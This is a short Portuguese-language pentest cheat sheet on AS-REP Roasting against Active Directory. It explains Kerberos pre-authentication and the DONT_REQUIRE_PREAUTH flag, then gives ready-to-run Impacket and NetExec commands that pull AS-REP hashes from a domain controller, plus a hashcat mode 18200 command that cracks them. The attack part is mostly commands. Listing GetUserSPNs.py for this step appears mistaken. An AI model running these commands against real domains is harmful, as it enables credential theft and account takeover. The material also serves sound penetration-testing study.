### 1. Entendendo o que é pre-authentication

- **Pre-authentication** é uma camada de segurança no Kerberos que exige que o usuário envie um timestamp cifrado (um “pre-auth data”) antes de receber o ticket TGT.
- Se estiver **desabilitado** no usuário, ao tentar autenticar, o KDC não exigirá essa etapa, e o servidor devolverá um AS-REP com hash que pode ser atacado (AS-REP Roasting).
---

### 2. Como verificar se pre-auth está habilitado para um usuário
No Active Directory, o atributo que indica se o pre-auth está desabilitado é o:
- `UserAccountControl` com flag `DONT_REQUIRE_PREAUTH` (valor: `0x400000` decimal 4194304)
Você pode verificar isso com uma consulta LDAP, PowerShell ou com ferramentas como o **Impacket**.

#### Get hash
```sh
GetUserSPNs.py -no-pass -usersfile users.txt dominio/ -dc-ip IP_DC
# ou
impacket-GetNPUsers -no-pass -dc-ip IP_DC dominio/usuario
#ou
nxc ldap 192.168.0.104 -u user.txt -p '' --asreproast output.txt
```

#### Crack hash
```sh
hashcat -m18200 output.txt wordlist
```